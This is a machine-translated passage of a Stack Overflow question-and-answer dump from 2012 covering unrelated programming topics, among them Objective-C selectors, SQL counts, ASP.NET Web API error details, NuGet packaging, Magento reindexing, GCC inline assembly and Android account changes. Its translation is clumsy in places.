例如，假设您`@property (assign) id delegate`的界面中有一个，其中`id`是指向任何类型对象的指针。即使`delegate`is not `nil`，您也不知道它是否实现了您在编译代码时为委托创建的正确协议。这样你就可以：

```
if ([delegate respondsToSelector:@selector(delegateMethod:)]) {
    [delegate performSelector:@selector(delegateMethod:)
                   withObject:param];
} 
```

当您需要检测对象的类型时，也可以使用它。您可以使用`performSelector:`来避免类型转换。这也消除了编译时不必要的警告。

对于多线程场景，您可能需要使用以下方法`NSObject`：

```
performSelectorOnMainThread:withObject:waitUntilDone:
performSelectorOnMainThread:withObject:waitUntilDone:modes:
performSelector:onThread:withObject:waitUntilDone:
performSelector:onThread:withObject:waitUntilDone:modes:
performSelectorInBackground:withObject: 
```

参考：

*   [https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/nsobject_Class/Reference/Reference.html](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/nsobject_Class/Reference/Reference.html)
*   [https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Protocols/NSObject_Protocol/Reference/NSObject.html](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Protocols/NSObject_Protocol/Reference/NSObject.html)

# c# - ajaxtoolkit手风琴面板，单击面板标题时取消gridview中的编辑模式

> ID：10246926
> 
> 赞同：0
> 
> 时间：2012-04-20T13:10:52.553
> 
> 标签：c#, asp.net, gridview

我有一个带有 4 个窗格的 ajax 手风琴面板。每个窗格中都有一个网格视图。所有 4 个 gridview 的 gridview 结构和控件 ID 都是相同的，允许我共享加载、保存等方法。

由于这些共享 ID，如果我在一个网格视图中单击编辑、切换窗格、在另一个网格视图中单击编辑，则会由于 ID 冲突而引发错误。

如果我在面板 1 中有 gridview 1 处于编辑模式，当我单击另一个面板的标题之一时，有没有办法退出该编辑模式？

# sql - 如何计算出现给定字符串的 2 列中的实例数？

> ID：10246928
> 
> 赞同：0
> 
> 时间：2012-04-20T13:11:02.843
> 
> 标签：sql, sql-server, sql-server-2008, count

这是一个示例表：

```
games_table
----------------------------------------------------
|   home_team   |   away_team   |   game_outcome   |
----------------------------------------------------
|    Chelsea    |    Arsenal    |     Home wins    |
----------------------------------------------------
|    Everton    |   Liverpool   |     Away wins    |
----------------------------------------------------
|    Arsenal    |    Chelsea    |     Home wins    |
---------------------------------------------------- 
```

我需要的是“切尔西”出现的次数，`WHERE game_outcome = 'Home wins'`在这个例子中是 2。

通常这会很容易，但我被困住了，因为我必须搜索 2 列。我真的需要一些见解。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T13:13:12.793

```
SELECT COUNT(*)
FROM   games_table
WHERE  game_outcome = 'Home wins'
AND    (home_team = 'Chelsea' OR away_team = 'Chelsea') 
```

# php - 使用 array_merge_recursive 将数组合并在一起，但只对添加到数组中的新内容进行处理？

> ID：10246929
> 
> 赞同：0
> 
> 时间：2012-04-20T13:11:13.170
> 
> 标签：php, arrays, array-merge

如果您发现标题具有误导性，对不起。我真的无法为这个问题想出一个好的标题。

我有两个数组，我在一个函数中合并在一起：

```
$arr1['something']['secondary_something'][]="foo1";
$arr1['something']['secondary_something'][]="foo2";
$arr1['something']['secondary_something'][]="foo3";

$arr2['something']['secondary_something'][]="foo4";
$arr2['something']['secondary_something'][]="foo5";

function something($array_, $array_new) {

$array=array_merge_recursive($array_,$array_new); // to combine/merge both arrays

print_r($array);//debugg

} 
```

现在该函数只是打印这个（这很好）：

```
Array ( [something] => Array ( [secondary_something] => Array ( [0] => foo1 [1] => foo2 [2] => foo3 [3] => foo4 [4] => foo5 ) ) ) 
```

但我需要处理已合并到主数组的新数据。所以我需要工作`$arr2`，但只有在它与`$arr1`.

当我说我需要“处理新数据”时，`var_export()`这是我需要对数组做的事情之一。

如果我只是做 a `echo var_export($array_new,true);`，我会得到这个：

```
array ( 'something' => array ( 'secondary_something' => array ( 0 => 'foo4', 1 => 'foo5', ), ), ) 
```

当我需要这个时：

```
array ( 'something' => array ( 'secondary_something' => array ( 3 => 'foo4', 4 => 'foo5', ), ), ) 
```

^^ 请注意数组键是 3 和 4，而不是 1 和 2。因为它已与主数组 ( `$arr1`) 合并。

希望你们明白我在做什么。

有任何想法吗？

谢谢xD

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T13:18:07.130

```
echo var_export(array_intersect($array['something']['secondary_something'], $arr2['something']['secondary_something']), true); 
```

**编辑**这行得通，但你失去了数组的多维方面。如果要在 var_export中保留`something`and方面，则需要编写一个递归函数来逐步遍历整个数组`secondary_something`

# ruby-on-rails - Rails 3 中 nil:NilClass 的未定义方法“名称”，仅在 RSpec 测试环境中

> ID：10246938
> 
> 赞同：-1
> 
> 时间：2012-04-20T13:11:35.663
> 
> 标签：ruby-on-rails, rspec

我收到此错误，但仅在测试中，而不是在开发或生产中。它与表示遗留数据库表的模型相关，该模型不符合基本的 Rails 表名约定，因为它被命名为**LUM_User**并且具有**UserID**的主键。

我终于发现，不知何故，表的测试版本是用名称**lum_user**而不是**LUM_User**创建的。一旦我解决了这个问题，错误就消失了。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-04-20T13:13:19.810

在原始帖子中回答：检查表格大小写并确保它与您在**set_table_name**语句中设置的内容相匹配。

# asp.net - 从 Web API 方法返回的错误消息在非开发环境中被省略

> ID：10246942
> 
> 赞同：28
> 
> 时间：2012-04-20T13:11:45.917
> 
> 标签：asp.net, iis, asp.net-web-api

我有一个 Web API 控制器 POST 方法，它在本地和测试服务器上表现良好。如果一切顺利，它会返回：

```
new HttpResponseMessage( HttpStatusCode.Created ) 
```

如果出现问题，它会返回：

```
new HttpResponseMessage<IEnumerable<string>>( usefulMessages, HttpStatusCode.BadRequest ); 
```

问题是当我向测试服务器发出一个导致错误的请求时，我得到了错误的请求代码，但我从来没有看到这些消息。如果我向本地机器发出完全相同的请求，我确实会看到这些消息。以下输出来自我自己的工具：

向我的本地机器发送请求，我得到：

```
Status code: 400 (BadRequest)
Response data: ["Error message one", "Error message two"] 
```

向我得到的测试服务器发送请求：

```
Status code: 400 (BadRequest)
Response data: Bad Request 
```

正在运行的代码完全相同。数据库是一样的。除了为请求提供服务的服务器之外，一切都相同。我什至有代码通过电子邮件向自己发送错误消息，因此我知道服务器正在生成正确的错误消息并且行为正确。这可能是 IIS 的事情（就像 customErrors = RemoteOnly for Web API 的等价物）？不仅响应数据中省略了错误消息，而且还发明了短语“Bad Request”来代替。

有任何想法吗？谢谢。

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-05-03T17:46:19.027

看看这个关于 HttpConfiguration.IncludesErrorDetailPolicy 的[MSDN 帖子：](http://msdn.microsoft.com/en-us/library/system.web.http.httpconfiguration.includeerrordetailpolicy(v=vs.108).aspx)

在您的 Global.asax 中：

```
var config = GlobalConfiguration.Configuration;
config.IncludeErrorDetailPolicy = IncludeErrorDetailPolicy.Always; 
```

我已使用此配置属性强制错误消息包含详细信息。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2014-05-12T13:50:29.393

有同样的问题。这确实是因为自定义错误设置。

在现实世界的场景中，您肯定希望在应用程序中使用自定义错误页面，但为了让自定义异常消息在 WebAPI 中正常工作，您需要禁用自定义错误页面。

如何解决这个问题？幸运的是，您可以使用`<location>`web.config 中的元素来解决这个问题。

解决方案：

```
 <!-- General for the application -->
  <system.web>
    <customErrors mode="RemoteOnly" defaultRedirect="YourCustomErrorPage.aspx"/>
  </system.web>

  <!-- Override it for paths starting with api (your WebAPI) -->
  <location path="api">
     <system.web>
        <customErrors mode="Off" />
     </system.web>
  </location> 
```

我在自己的应用程序中使用此方法，效果很好。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-04-24T17:52:35.810

对我来说，这听起来很可能是您的 customErrors 模式。WebAPI 在 ASP.NET (MVC) 之上运行，因此它使用所有相同的 web.config 设置。

如果是测试服务器，你可以尝试关闭 customErrors 来验证。

```
<system.web>
    <customErrors mode="Off" />
</system.web> 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2019-01-25T11:41:58.030

**欧文**

由于这里没有提到主机选择，我只想补充一点，在 OWIN 的情况下，您必须使用 syneptody 的解决方案，但不能在 Global.asax 中，根据[这个答案](https://stackoverflow.com/a/18922898/5480409)和我自己的测试。

您要`IncludeErrorDetailPolicy.Always`在`Startup.cs`文件中插入：

```
public void Configuration(IAppBuilder appBuilder)
{
    HttpConfiguration Config = new HttpConfiguration(); 
    Config.IncludeErrorDetailPolicy = IncludeErrorDetailPolicy.Always;
    ...
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-15T14:15:20.933

自测试版以来，Web API 代码库发生了许多变化。很多精彩。查看如何在[此处](http://blogs.msdn.com/b/henrikn/archive/2012/04/29/using-nightly-nuget-packages-with-asp-net-web-stack.aspx)获取每晚签名的版本。

`HttpResponseMessage<T>`不再支持泛型。使用`HttpRequestMessage.CreateResponse<T>`. 看到[这个](http://aspnetwebstack.codeplex.com/discussions/355170)和[这个](http://aspnetwebstack.codeplex.com/discussions/350492)。

如果您打算继续使用它，您将希望至少更新到当前的夜间版本，而不是使用测试版。有很多好的改进，特别是对于 Web API。

**编辑：**在我看来，这实际上与您最初的问题有关，因为虽然我没有调查具体答案，但似乎较新的东西返回的响应不会被 IIS 拦截。它可能与重新处理错误处理/错误报告有关。

**更新 8/14/2012**当前 MVC 4 / Web API 的候选版本已经足够好了。除非您想完全保持最新状态，否则您不再需要每晚构建。

# jmeter - 在 Jmeter 中同时运行两个线程组

> ID：10246943
> 
> 赞同：4
> 
> 时间：2012-04-20T13:11:46.790
> 
> 标签：jmeter

我在 Jmeter 中有两个独立的线程。如何在单次运行中同时运行这两个线程？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-20T17:17:22.310

如果您创建两个线程组，默认情况下 jmeter 将同时运行它们。

# iphone - 实例变量访问（通过 self）导致空指针取消引用

> ID：10246945
> 
> 赞同：13
> 
> 时间：2012-04-20T13:11:46.907
> 
> 标签：iphone, dereference

对我的应用程序运行分析会导致该主题出现逻辑错误。我真的不知道那是什么意思。以下是错误屏幕：

![在此处输入图像描述](../Images/68baa1039198be98287c0b1f218da9c6.png)

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-04-20T13:16:34.370

它向您显示的路径正在`super`返回`nil`。如果发生这种情况，您继续执行该方法；隐含的自尊是因为`isShowingLandscapeView`是一个实例变量。您需要将所有初始化都放在`if (self)`块内以避免这种情况。

# command-line - nuget pack 引发未设置为对象实例的对象引用。例外

> ID：10246949
> 
> 赞同：2
> 
> 时间：2012-04-20T13:12:09.817
> 
> 标签：command-line, nuget, nuget-package

我在使用 nuget.exe 命令行工具时遇到了一个奇怪的问题。

我有一个控制台应用程序，它启动一个执行 nuget 命令行工具的进程。

这是输出：

```
nuget.exe pack Project.csproj -Prop Configuration=Release 
Attempting to build package from 'Project.csproj'. Packing files from
'C:\Project\bin\Release'. 
```

它会抛出一个未设置为对象实例的对象引用。例外。

不过顺便说一下，我的进程WorkingDirectory是C:\Project，所以文件路径就ok了。

奇怪的是，当我使用标准的 windows 命令行时， cd 进入 .csproj 文件夹并执行相同的命令，正在创建 nupkg 文件。

如果我做：

```
cd .. 
```

并运行：

```
nuget.exe pack Project\Project.csproj -Prop Configuration=Release 
```

我得到的对象引用未设置为对象的实例。例外。

我的控制台应用程序代码是：

```
var process = new Process  {
    StartInfo = new ProcessStartInfo("nuget.exe", 
                                     "pack Project.csproj -Prop Configuration=Release")
                    {
                        WorkingDirectory = "C:\\Project",
                        UseShellExecute = false,
                        RedirectStandardInput = true,
                    }
}; 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-21T06:28:08.780

我遇到了同样的问题，我的问题是在更新包（并在 SVN 中合并）之后，packages.config 文件仍然引用了包的两个版本：旧包和新包。在我用旧包删除文件夹后，“对象引用未设置为对象的实例。” - 弹出错误。

因此，要解决该错误，请确保您的 packages.config 文件中只有一个版本的包。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-05T16:08:17.923

我认为发生此空引用错误是因为您的 packages.config 有一个您不再拥有的程序集的条目。

例如，我的 packages.config 是这样的。

```
<?xml version="1.0" encoding="utf-8"?>
<packages>
  <package id="H.Common" version="1.0.0.9" targetFramework="net35" />
  <package id="H.Common" version="1.0.0.10" targetFramework="net35" />
  <package id="H.Validation" version="3.0.0.50" targetFramework="net35" />
</packages> 
```

并且 nuget pack 引发了一个错误，因为该配置引用了一个 ghost 程序集。我删除了该行，现在配置变成了这样。

```
<?xml version="1.0" encoding="utf-8"?>
<packages>
  <package id="H.Common" version="1.0.0.10" targetFramework="net35" />
  <package id="H.Validation" version="3.0.0.50" targetFramework="net35" />
</packages> 
```

它现在编译快乐。

# mysql - Rails 获取每天最后一条记录的方法

> ID：10246957
> 
> 赞同：0
> 
> 时间：2012-04-20T13:12:59.280
> 
> 标签：mysql, ruby-on-rails, ruby-on-rails-3, activerecord

我有一个包含每小时记录（跨越多天）的表。我想做的是获取每天的最后一个小时记录。

我在这里找到了 MySQL 解决方案：[Retrieving the last record in each group](https://stackoverflow.com/questions/1313120/retrieving-the-last-record-in-each-group)（接受的答案对我来说看起来不错，或多或少有意义）

但是，我正在努力使用 Rails 查找器来实现这一点，因为不清楚如何在 Rails 中进行自我加入（所有文档都适用于关联）。

到目前为止，我已经尝试过这个......但无济于事（它说“id”列不明确）。

```
Report.joins("LEFT JOIN reports r2 ON (date('created_at') = date('r2.created_at') AND id < r2.id)").where("r2.id IS NULL") 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T13:58:48.323

您可能只需要`reports`在 SQL 中显式引用您的表：

```
Report.joins("LEFT JOIN reports r2 ON (date('reports.created_at') = date('r2.created_at') AND reports.id < r2.id)").where("r2.id IS NULL") 
```

对于实现此目的的更多“Railsey”方式，您可能需要查看`finder_sql`选项[`has_many`](http://api.rubyonrails.org/classes/ActiveRecord/Associations/ClassMethods.html#method-i-has_many)并创建一个关联来执行此操作。

# magento - Magento 更新产品属性而不触发重新索引

> ID：10246962
> 
> 赞同：3
> 
> 时间：2012-04-20T13:13:18.957
> 
> 标签：magento

是否可以在不触发重新索引的情况下更新产品属性？

众所周知，load()/setData()/save() 场景会触发重新索引。

我已经查看了“Mage_Catalog_Model_Product_Action”中的“updateAttributes”方法，但我认为它也会触发产品重新索引。

```
/**
     * Update attribute values for entity list per store
     *
     * @param array $productIds
     * @param array $attrData
     * @param int $storeId
     * @return Mage_Catalog_Model_Product_Action
     */
    public function updateAttributes($productIds, $attrData, $storeId)
    {
        $this->_getResource()->updateAttributes($productIds, $attrData, $storeId);
        $this->setData(array(
            'product_ids'       => array_unique($productIds),
            'attributes_data'   => $attrData,
            'store_id'          => $storeId
        ));

        // register mass action indexer event
        Mage::getSingleton('index/indexer')->processEntityAction(
            $this, Mage_Catalog_Model_Product::ENTITY, Mage_Index_Model_Event::TYPE_MASS_ACTION
        );
        return $this;
    } 
```

'// register mass action indexer event' 下的代码似乎触发了索引器操作。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-23T17:40:16.043

我找到了在不触发重新索引的情况下更新产品属性的方法。

主要思想如下：如果你对产品的Model进行更新操作，就会触发reindex，但是如果你对Resource进行这些操作，那么特定的操作是在没有reindex的情况下完成的。

例如：

```
/**
* This method updates product attributes then triggers reindex
*/
Mage_Catalog_Model_Product_Action->updateAttributes($productIds, $attrData, $storeId);

/**
* This method updates product attributes but doesn't trigger reindex
*/
Mage_Catalog_Model_Resource_Eav_Mysql4_Product_Action->updateAttributes($productIds, $attrData, $storeId); 
```

在哪里：

*   `$productIds`- 带有产品 ID 的数组
*   `$attrData`- 将键作为属性名称，将值作为属性值的数组
*   `$storeId`- 产品指定商店的商店ID（如果您的产品被分配到不同商店的多个类别）；

如果属性是全局的`Mage_Core_Model_App::ADMIN_STORE_ID`可以使用

干杯!

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-04-21T13:40:13.277

您可以先像这样停止索引器：

```
$processes = Mage::getSingleton('index/indexer')->getProcessesCollection();
$processes->walk('setMode', array(Mage_Index_Model_Process::MODE_MANUAL));
$processes->walk('save'); 
```

然后进行更新，然后像这样重新索引：

```
$processes = Mage::getSingleton('index/indexer')->getProcessesCollection();
$processes->walk('reindexAll');
$processes->walk('setMode', array(Mage_Index_Model_Process::MODE_REAL_TIME));
$processes->walk('save'); 
```

来源：[https ://gist.github.com/2217520](https://gist.github.com/2217520)

希望这可以帮助！

# php - Twitter Feed 没有使用代码？

> ID：10246964
> 
> 赞同：0
> 
> 时间：2012-04-20T13:13:24.497
> 
> 标签：php, javascript, twitter

我想知道为什么下面的代码我试图用来拉入最新推文的推特提要，不起作用？

***代码：***

```
<?
    $username = "readitforward";
    $limit = 5;
    $feed = 'http://twitter.com/statuses/user_timeline.rss?screen_name='.$username.'&count='.$limit;
    $tweets = file_get_contents($feed);

        $tweets = str_replace("&", "&", $tweets);   
        $tweets = str_replace("<", "<", $tweets);
        $tweets = str_replace(">", ">", $tweets);
        $tweet = explode("<item>", $tweets);
    $tcount = count($tweet) - 1;

for ($i = 1; $i <= $tcount; $i++) {
    $endtweet = explode("</item>", $tweet[$i]);
    $title = explode("<title>", $endtweet[0]);
    $content = explode("</title>", $title[1]);
        $content[0] = str_replace("&#8211;", "&mdash;", $content[0]);

        $content[0] = preg_replace("/(http:\/\/|(www\.))(([^\s<]{4,68})[^\s<]*)/", '<a href="http://$2$3" target="_blank">$1$2$4</a>', $content[0]);
        $content[0] = str_replace("$username: ", "", $content[0]);
        $content[0] = preg_replace("/@(\w+)/", "<a href=\"http://www.twitter.com/\\1\" target=\"_blank\">@\\1</a>", $content[0]);
        $content[0] = preg_replace("/#(\w+)/", "<a href=\"http://search.twitter.com/search?q=\\1\" target=\"_blank\">#\\1</a>", $content[0]);
    $mytweets[] = $content[0];
}

while (list(, $v) = each($mytweets)) {
    $tweetout .= "<div>$v</div>\n";
}
?> 
```

***输出错误：***

```
Warning: file_get_contents() [function.file-get-contents]: http:// wrapper is disabled in the server configuration by allow_url_fopen=0 in /data/24/1/0/139/1815302/user/1967139/htdocs/RIF/wp-content/themes/crown_readitforward2012/sidebar.php on line 93

Warning: file_get_contents(http://twitter.com/statuses/user_timeline.rss?screen_name=readitforward&count=5) [function.file-get-contents]: failed to open stream: no suitable wrapper could be found in /data/24/1/0/139/1815302/user/1967139/htdocs/RIF/wp-content/themes/crown_readitforward2012/sidebar.php on line 93

Warning: Variable passed to each() is not an array or object in /data/24/1/0/139/1815302/user/1967139/htdocs/RIF/wp-content/themes/crown_readitforward2012/sidebar.php on line 114 
```

**第 93 行：** `$tweets = file_get_contents($feed);`

**第 114 行：** `while (list(, $v) = each($mytweets)) {`

*我在这里做错了什么？？？*

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-10T16:45:54.527

查看推特 API 更新。

`$feed`将变量更改为：

```
$feed = 'http://api.twitter.com/1/statuses/user_timeline.rss?screen_name='.$username.'&count='.$limit; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T13:15:12.287

allow_url_fopen 已关闭，因此您必须以另一种方式获取远程文件。

[http://php.net/manual/en/filesystem.configuration.php#ini.allow-url-fopen](http://php.net/manual/en/filesystem.configuration.php#ini.allow-url-fopen)

您可以改用 cURL 或其他 php 扩展。

[http://php.net/manual/en/curl.examples-basic.php](http://php.net/manual/en/curl.examples-basic.php)

对于第二个错误检查 if(is_array($mytweets)) .. 在执行循环之前。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T13:17:10.123

打开`php.ini`并启用`allow_url_fopen`. 这不能用`ini_set()`.

或者，使用其他请求 URL 的方法，例如 cURL。

# c# - .NET网站可以访问C盘，添加vba宏到ms office，并在Outlook中启用宏安全吗？

> ID：10246965
> 
> 赞同：0
> 
> 时间：2012-04-20T13:13:25.070
> 
> 标签：c#, .net, outlook, ms-office, office-interop

这是场景：

有一个存储一组宏（Outlook 插件）的 Intranet 网站。现在我希望用户访问，选择他们感兴趣的（语言）并将其安装到他们的 Outlook 中。

当然，我首先需要找到正确的文件夹，一些用户仍然有旧图像，并且他们的 Outlook 配置文件位于 Windows/Microsoft 中。其中一些使用 2003 年，一些 2010 年，但大多数使用 2007 年。

所以问题如下：我可以...

*   使用 .NET WEBSITE 导航到用户的 C:/.. 驱动器？
*   安装新宏？
*   启用 Outlook 的宏安全 ?

编辑：

我试图克服用户连接到我的共享文件夹，运行 12345.bat 的过程，然后获得一个命令提示符窗口，在该窗口上他们有许多选项：不同版本的 Office/语言等，这当然需要他们关闭所有办公应用程序，并启用宏 - 再次重新启动 Outlook...

这太痛苦了，让我看不到谁安装了，不管它是否有效。可能的错误等

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T13:36:01.473

让用户下载安装程序。出于显而易见的原因，不允许从网站访问 C:\ 驱动器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T13:39:45.247

当然不是因为安全原因。用户需要下载和安装/运行/无论您的文件。您可以创建一个可安装或可运行的可执行文件并让用户下载它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T13:51:19.497

**TL;博士;** 您不能通过 HTTP 执行此操作，但在 Intranet 上，通过正确设置权限，您可以完全编写此代码，因为服务器可以直接访问客户端的 C 驱动器，而无需让客户端执行任何工作.

**完整说明**

网站无法使用客户端技术（javascript 等）接触客户的硬盘。安全问题将是巨大的。 **但是**，服务器可以完全接触自己的硬盘驱动器，***以及***它有权访问的 Intranet 上其他计算机的驱动器。

如果您正确设置了 Intranet，您可以简单地将网站设计为通过 Intranet 运行修改用户计算机的脚本的“触发器”，而不是直接通过网站。

# entity-framework - 实体框架代码优先与 Guid

> ID：10246968
> 
> 赞同：5
> 
> 时间：2012-04-20T13:13:36.723
> 
> 标签：entity-framework, entity-framework-4, entity-framework-4.3

在我的简单类中，我使用数据注释将属性映射到列，如下所示：

```
[Table("Member")]
public class Member
{
    [Key]
    public Guid MemberId { get; set; }

    // More properties go here
} 
```

我已经可以将新成员写入我的表，但 MemberId 始终默认为新的 Guid (0000-000-00 ...)，而不是漂亮的服务器生成的 Guid。

我见过人们在 EDMX 文件中更改一些名为 StoreGeneratedPattern 的设置的场景。但由于我使用的是 Code First 显然我没有这个 EDMX 文件......

那么我将如何解决这个问题呢？

很感谢任何形式的帮助。

## 更新！！

好的，我自己找到了答案。您可以使用注释。

```
[Table("Member")]
public class Member
{
    [Key]
    [DatabaseGenerated(DatabaseGeneratedOption.Identity)]
    public Guid MemberId { get; set; }

    // More properties go here
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-26T10:44:40.123

使用注释：

```
[Table("Member")]
public class Member
{
    [Key]
    [DatabaseGenerated(DatabaseGeneratedOption.Identity)]
    public Guid MemberId { get; set; }

    // More properties go here
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-20T13:21:09.510

我一直在类构造函数中初始化我的 Guid，因为您不需要/不能使用与 int 类型键一起使用的自动增量功能。

所以，我会换成...

```
[Table("Member")]
public class Member
{
    [Key]
    public Guid MemberId (get; set;}

    public Member
    {
      MemberId = Guid.NewGuid();
    }
} 
```

# bit - 检测稀疏位模式

> ID：10246970
> 
> 赞同：1
> 
> 时间：2012-04-20T13:13:43.127
> 
> 标签：bit, sparse-matrix

如果我有两个 32 位整数，那么检测其中哪些具有密集/稀疏位分布的最佳方法是什么？例如，0xef00 和 0x1131。想知道是否有任何指标/转换可以告诉我选择后者？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T16:11:38.320

这是一个可能的指标：

```
sparseness = popcnt((x<<2) | (x<<1) | x | (x>>1) | (x>>2)) / popcnt(x) 
```

sparseness = 1 .. 3 表示密集位分布，sparseness = 3 .. 5 表示稀疏位分布。

您可以使用不同数量的移位和/或使用位旋转而不是移位。

# jquery - 如何生成 twitter @anywhere 认证密码

> ID：10246973
> 
> 赞同：0
> 
> 时间：2012-04-20T13:13:54.257
> 
> 标签：jquery, mysql, wordpress, twitter, twitter-anywhere

我正在使用 wordpress，但我需要放置一个 twitter @anywhere / login 连接按钮。

我的问题是，我到底怎么知道他们的密码是什么？

获取用户名等一切都很好......但是我如何在不知道他/她的密码的情况下触发我的 wordpress 登录用户，我现在所能做的就是知道他们已经登录了 twitter 就是这样，但显然 twitter 不会把他/她的密码泄露出去！

有什么建议么？

**更新**

这是目前为止的过程...

*   显示推特连接按钮
*   使用完整的监听器来捕获用户“screen_name”
*   ？？？现在我需要为表单分配一个密码来让这个用户登录......？？？

那就是我的堆栈。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T13:18:02.400

如果您使用 Twitter 的 OAuth 对用户进行身份验证，则不需要他们的密码。如果您可以获取用户信息（姓名、电子邮件等），则该用户在 Twitter 中已通过身份验证，并已授权您的应用访问他的数据。获取数据并完成您的工作（创建您的本地用户帐户并以编程方式登录）。

这是一个可能对您有所帮助的插件：[http ://wordpress.org/extend/plugins/simple-twitter-connect/](http://wordpress.org/extend/plugins/simple-twitter-connect/)

这里还有一个 Wordpress API 调用，可让您登录用户：[http ://codex.wordpress.org/Function_Reference/wp_signon](http://codex.wordpress.org/Function_Reference/wp_signon)

# c - 如何使用 GCC 生成 IP 相对寻址指令

> ID：10246974
> 
> 赞同：1
> 
> 时间：2012-04-20T13:13:55.450
> 
> 标签：c, linux, assembly, x86

我写了一个小程序来测试 GCC 的选项。

```
int main()
{
    int a=0;
    __asm__("movl %0,%%ecx\n"
            "jmp jmpsection\n"
            "inc %%ecx\n"
            "jmpsection: movl $1,%%eax\n"
            "movl $0,%%ebx\n"
            "int $0x80\n"::"a"(a):"ecx","ebx");
} 
```

为了保持 var a 等于 1，请跳过 inc 指令。我想强制 GCC 使用 IP 相对寻址方法生成 jmp 指令。我搜索了 GCC 手册以找到解决方案，但我失败了。感谢重播。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T13:26:17.323

对于 x86，IP 相对寻址只能在长模式（64 位）下使用，而且您似乎正在编写 32 位代码。

**编辑：**实际上，在 32 位模式下，*可以*相对于当前 IP 进行跳转，我认为编译器实际上会在您的情况下生成正确的代码。我们来看看生成的程序集的相关部分：

```
00000000 <main>:
  ...
  13:   eb 01                   jmp    16 <jmpsection>
  15:   41                      inc    %ecx

00000016 <jmpsection>:
  16:   b8 01 00 00 00          mov    $0x1,%eax
  ... 
```

因此，虽然*看起来*地址 13 的指令直接跳转到地址 16，但它实际上*是*IP 相对跳转。看一下机器码：

```
eb 01 
```

`eb``jmp`是8 位位移的短路操作码。`01`是这个位移。该指令的结果是跳转到`%eip + 0x01`，并且当 IP 指向要执行的*下一*条指令时，它将跳转到地址 16。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T17:00:54.337

当您在 GCC 中使用内联汇编时，汇编代码只是直接传递给汇编器。GCC 命令行选项不会更改您的汇编代码。您可以验证查看输出（使用 -S 选项）。编译器选项只会改变 GCC 从 C 代码生成程序集的方式。

因此，您需要查看[汇编器手册，而不是编译器手册](ftp://ftp.gnu.org/old-gnu/Manuals/gas/html_node/as_toc.html)。在您的情况下，GAS 可能会选择简短的 PC 相关编码，`jmp`而无需指定任何选项。

# android - Android 应用程序应如何响应环境中的重大变化？

> ID：10246975
> 
> 赞同：10
> 
> 时间：2012-04-20T13:13:55.723
> 
> 标签：android

假设有一个在 AccountManager 中创建帐户的应用程序。用户浏览了这个应用程序相当复杂的活动图一段时间，然后进入`Accounts and Sync`Android 设置，删除帐户并登录（仍然`Accounts and Sync`以其他用户身份登录。

我已经定义了一个`LOGIN_ACCOUNTS_CHANGED`广播接收器，我可以优雅地关闭所有服务。但是活动仍然存在，在他们的标题中带有第一个用户的名字（UI 在很多方面都搞砸了，但这个是最明显的）。

那么，问题来了：这些孤儿活动应该怎么办？

*   我可以使用类似的东西`clearTaskOnLaunch`，但是当更改发生时，所有活动都在后台。
*   在 SharedPreferences 中设置一个标志并签入`onResume()`每个活动，然后`clearTask`在需要时启动活动？太乱了
*   我能想到的最好的选择是`android.os.Process.killProcess(android.os.Process.myPid())`用来杀死所有的活动。这不是太优雅，但可以完成工作。唯一的副作用是活动堆栈仍然存在，此时最合理的事情似乎是从`LAUNCHER`活动开始，并具有清晰的历史记录。

那么，响应所描述场景的最佳方式是什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-24T13:01:09.030

让您的所有活动都从`MyActivity`具有成员的类扩展`BroadcastReceiver`：mChangeReceiver。

将mChangeReceiver`MyActivity`注册到`onCreate`（并取消注册`onDestroy`）到`LOGIN_ACCOUNTS_CHANGED`意图。

让 mChangeReceiver 调用一些抽象方法`onAccountChanged()`，所有扩展类都需要重写和实现以反映 GUI 中的更改。

而已。现在，每当帐户更改时，您所有的活动都会`onAccountChanged`调用它们的方法并刷新它们的 GUI。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-28T21:42:33.223

基于您拥有用户登录机制的事实，我有一些想法：

关于 UI ，如何在 onPause 时将用户名 UI（可能是 textview）更新为 "" 并在 onResume 时将其更新为当前用户？

关于如果需要关闭活动，您可以将当前用户保存到全局变量和每个活动中。每个活动都应检查全局活动是否与他们上次更新时存储的活动相同。如果它们不同，您可以关闭活动。你也可以使用你写的 clearTask 标志。

另一种处理活动的方法是使用片段堆栈。有关更多信息，请查看片段堆栈的 android 支持示例。

# codeigniter - Codeigniter：遇到 PHP 错误

> ID：10246980
> 
> 赞同：0
> 
> 时间：2012-04-20T13:14:09.923
> 
> 标签：codeigniter

在我的代码中他们是一个错误这是什么解决方案

遇到 PHP 错误

严重性：警告

